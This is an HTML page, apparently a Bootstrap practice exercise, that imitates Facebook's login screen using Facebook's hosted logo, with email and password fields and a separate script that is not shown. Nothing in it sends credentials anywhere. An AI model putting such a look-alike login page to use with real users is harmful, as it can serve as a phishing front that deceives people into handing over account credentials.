<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Bootstrap demo</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
  </head>
  <body style="background-color: #f2f2f5;">

    <section class="">
        <div class="d-flex  justify-content-center">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" height="79px" width="240px">
        </div>
        <h3 class="text-center">Log in to Facebook</h3>

        <div class="d-flex justify-content-center bg-white shadow rounded-2 " style="width: 500px; height: 300px;" >
            
            <form class="d-flex flex-column w-75">
                <div>
                    <label for="email"></label>
                    <input class="w-100 rounded-2 p-3" type="email" id="email" name="email" placeholder="Email address or phone number">
                    <span class="error"></span>
                </div>
                <div>
                    <label for="password"></label>
                    <input class="w-100 rounded-2 p-3 mb-3" type="password" id="password" name="password" placeholder="Password">
                    <span class="error"></span>
                </div>
                <button class="btn btn-primary">Log in</button>
            </form>
        </div>
    </section>
  


    <script src="./loginfacebook.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>
  </body>
</html>
